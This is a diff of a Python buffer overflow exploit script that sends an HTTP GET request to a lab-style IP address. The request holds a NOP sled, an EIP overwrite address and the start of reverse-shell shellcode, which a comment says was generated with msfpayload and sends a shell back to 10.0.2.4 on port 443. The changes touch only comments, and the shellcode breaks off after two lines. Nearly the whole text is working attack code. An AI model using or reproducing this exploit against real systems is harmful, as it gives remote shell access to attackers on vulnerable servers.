@@ -1,16 +1,16 @@
 #!/usr/bin/python
 import socket
 
-# Port and ipaddress initialized here”
+# initialize port/ip
 
 target_address="192.168.56.101”
 target_port=80
 
 buffer = "GET "
 buffer+= "\x90" * 1787
-buffer+= "\x65\x82\xA5\x7C" # EIP Overwrite. Shell32.dll, XP SP2, JMP ESP, 7CA58265.
+buffer+= "\x65\x82\xA5\x7C" 
 # msfpayload windows/shell_reverse_tcp LHOST=10.0.2.4 LPORT=443 R | msfencode -a x86 -b '\x00\x0a\x0d' -t c - x86/shikata_ga_nai 342 bytes
-# create buffer
+
 buffer+= "\x90" * 16
 buffer+= ("\xdb\xdd\xd9\x74\x24\xf4\x2b\xc9\xb1\x4f\x58\xba\x2c\x98\x23"
 "\x27\x31\x50\x1a\x83\xe8\xfc\x03\x50\x16\xe2\xd9\x64\xcb\xae"
